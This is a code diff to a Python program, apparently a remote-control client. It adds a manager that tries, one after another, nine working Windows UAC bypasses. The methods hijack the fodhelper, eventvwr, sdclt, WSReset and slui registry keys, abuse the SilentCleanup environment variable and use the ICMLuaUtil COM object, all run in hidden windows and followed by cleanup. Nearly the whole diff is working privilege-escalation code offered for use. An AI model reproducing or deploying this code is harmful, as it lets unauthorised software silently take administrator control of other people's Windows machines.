@@ -966,6 +966,600 @@ LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility
 
 # --- Privilege Escalation Functions ---
 
+# ADVANCED UAC BYPASS CLASSES (from client-chop-version)
+class UACBypassError(Exception):
+    """Custom exception for UAC bypass errors"""
+    pass
+
+class UACBypassMethod:
+    """Base class for UAC bypass methods with enhanced error handling"""
+    
+    def __init__(self, name: str, description: str, method_id: int):
+        self.name = name
+        self.description = description
+        self.method_id = method_id
+        self._lock = threading.Lock()
+    
+    def execute(self) -> bool:
+        """Execute the UAC bypass method with enhanced error handling"""
+        if not self.is_available():
+            raise UACBypassError(f"{self.name} not available on this system")
+        
+        with self._lock:
+            try:
+                log_message(f"[UAC BYPASS] Attempting method: {self.name} (ID: {self.method_id})", "info")
+                result = self._execute_bypass()
+                
+                if result:
+                    log_message(f"✅ [UAC BYPASS] SUCCESS! Method {self.name} worked!", "success")
+                else:
+                    log_message(f"[UAC BYPASS] Method {self.name} returned False", "warning")
+                
+                return result
+                
+            except Exception as e:
+                log_message(f"[UAC BYPASS] Method {self.name} failed: {e}", "error")
+                raise UACBypassError(f"{self.name} failed: {e}")
+    
+    def _execute_bypass(self) -> bool:
+        """Override this method in subclasses"""
+        raise NotImplementedError("Subclasses must implement _execute_bypass")
+    
+    def is_available(self) -> bool:
+        """Check if this method is available on the current system"""
+        return WINDOWS_AVAILABLE
+    
+    def get_current_executable(self) -> str:
+        """Get the current executable path for elevation"""
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            return f'python.exe "{current_exe}"'
+        return current_exe
+    
+    def cleanup_registry(self, key_path: str, hive=None) -> None:
+        """Clean up registry entries with proper error handling"""
+        try:
+            import winreg
+            if hive is None:
+                hive = winreg.HKEY_CURRENT_USER
+            
+            winreg.DeleteKey(hive, key_path)
+            log_message(f"[CLEANUP] Registry key cleaned: {key_path}", "debug")
+        except Exception as e:
+            log_message(f"[CLEANUP] Registry cleanup failed for {key_path}: {e}", "debug")
+
+class UACBypassManager:
+    """ADVANCED UAC bypass manager with professional architecture"""
+    
+    def __init__(self):
+        self._lock = threading.RLock()
+        self.methods = {}
+        self._initialize_methods()
+    
+    def _initialize_methods(self):
+        """Initialize all UAC bypass methods"""
+        # Register all bypass methods
+        method_list = [
+            ('fodhelper', FodhelperProtocolBypass()),
+            ('computerdefaults', ComputerDefaultsBypass()),
+            ('eventvwr', EventViewerBypass()),
+            ('sdclt', SdcltBypass()),
+            ('wsreset', WSResetBypass()),
+            ('slui', SluiBypass()),
+            ('winsat', WinsatBypass()),
+            ('silentcleanup', SilentCleanupBypass()),
+            ('icmluautil', ICMLuaUtilBypass()),
+        ]
+        
+        for name, method in method_list:
+            self.methods[name] = method
+        
+        log_message(f"[UAC MANAGER] Initialized {len(self.methods)} UAC bypass methods", "info")
+    
+    def get_available_methods(self) -> list:
+        """Get list of available UAC bypass methods"""
+        with self._lock:
+            available = [name for name, method in self.methods.items() if method.is_available()]
+            log_message(f"[UAC MANAGER] {len(available)}/{len(self.methods)} methods available", "info")
+            return available
+    
+    def execute_method(self, method_name: str) -> bool:
+        """Execute a specific UAC bypass method"""
+        with self._lock:
+            if method_name not in self.methods:
+                log_message(f"[UAC MANAGER] Unknown method: {method_name}", "error")
+                return False
+            
+            method = self.methods[method_name]
+            
+            if not method.is_available():
+                log_message(f"[UAC MANAGER] Method '{method_name}' not available", "warning")
+                return False
+            
+            try:
+                log_message(f"[UAC MANAGER] Executing method: {method.name}", "info")
+                result = method.execute()
+                
+                if result:
+                    log_message(f"✅ [UAC MANAGER] Method '{method_name}' succeeded!", "success")
+                else:
+                    log_message(f"[UAC MANAGER] Method '{method_name}' failed", "warning")
+                
+                return result
+                
+            except UACBypassError as e:
+                log_message(f"[UAC MANAGER] Method '{method_name}' error: {e}", "error")
+                return False
+            except Exception as e:
+                log_message(f"[UAC MANAGER] Unexpected error in '{method_name}': {e}", "error")
+                return False
+    
+    def try_all_methods(self) -> bool:
+        """Try all available UAC bypass methods until one succeeds"""
+        with self._lock:
+            available_methods = self.get_available_methods()
+            
+            if not available_methods:
+                log_message("[UAC MANAGER] No UAC bypass methods available", "warning")
+                return False
+            
+            log_message(f"[UAC MANAGER] Trying {len(available_methods)} UAC bypass methods...", "info")
+            
+            for i, method_name in enumerate(available_methods, 1):
+                try:
+                    log_message(f"[UAC MANAGER] Attempt {i}/{len(available_methods)}: {method_name}", "info")
+                    if self.execute_method(method_name):
+                        log_message(f"✅ [UAC MANAGER] UAC bypass successful with method: {method_name}!", "success")
+                        return True
+                except Exception as e:
+                    log_message(f"[UAC MANAGER] Error trying method '{method_name}': {e}", "error")
+                    continue
+            
+            log_message("[UAC MANAGER] ❌ All UAC bypass methods failed", "error")
+            return False
+    
+    def run_as_admin(self) -> bool:
+        """Attempt to run the current process as administrator"""
+        if is_admin():
+            log_message("[UAC MANAGER] Already running as administrator", "info")
+            return True
+        
+        log_message("[UAC MANAGER] Attempting to escalate privileges...", "info")
+        return self.try_all_methods()
+
+# ADVANCED UAC BYPASS METHOD CLASSES
+
+class FodhelperProtocolBypass(UACBypassMethod):
+    """Enhanced UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Fodhelper Protocol",
+            "UAC bypass using fodhelper.exe and ms-settings protocol",
+            33
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\fodhelper.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            # Create protocol handler
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute fodhelper
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\fodhelper.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
+
+class ComputerDefaultsBypass(UACBypassMethod):
+    """Enhanced UAC bypass using computerdefaults.exe"""
+    
+    def __init__(self):
+        super().__init__(
+            "Computer Defaults",
+            "UAC bypass using computerdefaults.exe",
+            33
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\ComputerDefaults.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\ComputerDefaults.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Computer defaults bypass failed: {e}")
+
+class EventViewerBypass(UACBypassMethod):
+    """Enhanced UAC bypass using EventVwr.exe (UACME Method 25)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Event Viewer",
+            "UAC bypass using EventVwr.exe registry hijacking",
+            25
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\eventvwr.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\mscfile\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\eventvwr.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Event Viewer bypass failed: {e}")
+
+class SdcltBypass(UACBypassMethod):
+    """Enhanced UAC bypass using sdclt.exe (UACME Method 31)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Sdclt",
+            "UAC bypass using sdclt.exe",
+            31
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\sdclt.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\sdclt.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Sdclt bypass failed: {e}")
+
+class WSResetBypass(UACBypassMethod):
+    """Enhanced UAC bypass using WSReset.exe (UACME Method 56)"""
+    
+    def __init__(self):
+        super().__init__(
+            "WSReset",
+            "UAC bypass using WSReset.exe",
+            56
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\WSReset.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\WSReset.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=15)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(3)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"WSReset bypass failed: {e}")
+
+class SluiBypass(UACBypassMethod):
+    """Enhanced UAC bypass using slui.exe (UACME Method 45)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Slui",
+            "UAC bypass using slui.exe",
+            45
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\slui.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\exefile\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\slui.exe"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=10)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Slui bypass failed: {e}")
+
+class WinsatBypass(UACBypassMethod):
+    """Enhanced UAC bypass using winsat.exe (UACME Method 67)"""
+    
+    def __init__(self):
+        super().__init__(
+            "Winsat",
+            "UAC bypass using winsat.exe",
+            67
+        )
+    
+    def is_available(self) -> bool:
+        return super().is_available() and os.path.exists(r"C:\Windows\System32\winsat.exe")
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Software\Classes\Folder\shell\open\command"
+            
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            process = subprocess.Popen(
+                [r"C:\Windows\System32\winsat.exe", "disk"],
+                creationflags=subprocess.CREATE_NO_WINDOW,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            
+            try:
+                process.communicate(timeout=20)
+            except subprocess.TimeoutExpired:
+                process.kill()
+            
+            time.sleep(2)
+            self.cleanup_registry(key_path)
+            return True
+            
+        except Exception as e:
+            try:
+                self.cleanup_registry(key_path)
+            except:
+                pass
+            raise UACBypassError(f"Winsat bypass failed: {e}")
+
+class SilentCleanupBypass(UACBypassMethod):
+    """Enhanced UAC bypass using SilentCleanup scheduled task (UACME Method 34)"""
+    
+    def __init__(self):
+        super().__init__(
+            "SilentCleanup",
+            "UAC bypass using SilentCleanup scheduled task",
+            34
+        )
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import winreg
+            
+            current_exe = self.get_current_executable()
+            key_path = r"Environment"
+            
+            # Set environment variable
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, f"{current_exe} & ")
+            winreg.CloseKey(key)
+            
+            # Execute SilentCleanup task
+            result = subprocess.run([
+                "schtasks", "/run", "/tn", r"\Microsoft\Windows\DiskCleanup\SilentCleanup"
+            ], capture_output=True, text=True, timeout=30)
+            
+            time.sleep(5)
+            
+            # Clean up
+            self._cleanup_environment()
+            return True
+            
+        except Exception as e:
+            try:
+                self._cleanup_environment()
+            except:
+                pass
+            raise UACBypassError(f"SilentCleanup bypass failed: {e}")
+    
+    def _cleanup_environment(self) -> None:
+        """Clean up environment variable"""
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_SET_VALUE)
+            winreg.DeleteValue(key, "windir")
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
+class ICMLuaUtilBypass(UACBypassMethod):
+    """Enhanced UAC bypass using ICMLuaUtil COM interface (UACME Method 41)"""
+    
+    def __init__(self):
+        super().__init__(
+            "ICMLuaUtil COM",
+            "UAC bypass using ICMLuaUtil COM interface",
+            41
+        )
+    
+    def is_available(self) -> bool:
+        try:
+            import win32com.client
+            import pythoncom
+            return super().is_available()
+        except ImportError:
+            return False
+    
+    def _execute_bypass(self) -> bool:
+        try:
+            import win32com.client
+            import pythoncom
+            
+            pythoncom.CoInitialize()
+            
+            try:
+                lua_util = win32com.client.Dispatch(
+                    "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+                )
+                
+                current_exe = self.get_current_executable()
+                lua_util.ShellExec(current_exe, "", "", 0, 1)
+                
+                return True
+                
+            finally:
+                pythoncom.CoUninitialize()
+                
+        except Exception as e:
+            raise UACBypassError(f"ICMLuaUtil COM bypass failed: {e}")
+
+# Global UAC bypass manager instance
+uac_manager = UACBypassManager()
+
 def is_admin():
     """Check if the current process has admin privileges."""
     if WINDOWS_AVAILABLE:
@@ -1035,51 +1629,26 @@ def keep_trying_elevation():
     log_message(f"⚠️ [ELEVATION] Failed to gain admin after {max_retries} attempts")
 
 def attempt_uac_bypass():
-    """Attempt to bypass UAC using various advanced methods."""
+    """Attempt to bypass UAC using the ADVANCED UAC Manager."""
     if not WINDOWS_AVAILABLE:
         return False
     
     if is_admin():
+        log_message("[UAC BYPASS] Already running as admin", "info")
         return True
     
-    log_message("[UAC BYPASS] Starting automatic UAC bypass sequence...")
+    log_message("[UAC BYPASS] Starting ADVANCED UAC bypass using UAC Manager...", "info")
     
-    # Advanced UAC bypass methods (UACME-inspired) - 20 methods!
-    bypass_methods = [
-        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol (MOST RELIABLE)
-        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
-        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
-        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
-        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
-        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
-        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
-        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
-        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
-        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
-        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
-        bypass_uac_token_manipulation, # Method 35: Token manipulation
-        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
-        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
-        bypass_uac_com_handlers,       # Method 40: COM handler hijack
-        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
-        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
-        bypass_uac_mock_directory,     # Method 62: Mock directory technique
-        bypass_uac_winsat,             # Method 67: winsat.exe bypass
-        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
-    ]
+    # Use the professional UAC Manager
+    global uac_manager
+    result = uac_manager.try_all_methods()
     
-    for i, method in enumerate(bypass_methods, 1):
-        try:
-            log_message(f"[UAC BYPASS] Trying method {i}/{len(bypass_methods)}: {method.__name__}...")
-            if method():
-                log_message(f"✅ [UAC BYPASS] SUCCESS! Method {method.__name__} worked!")
-                return True
-        except Exception as e:
-            log_message(f"[UAC BYPASS] Method {method.__name__} failed: {e}", "debug")
-            continue
+    if result:
+        log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
+    else:
+        log_message("❌ [UAC BYPASS] All UAC Manager methods failed", "error")
     
-    log_message("[UAC BYPASS] All 20 methods attempted - none succeeded")
-    return False
+    return result
 
 # Alias for compatibility
 def elevate_privileges():
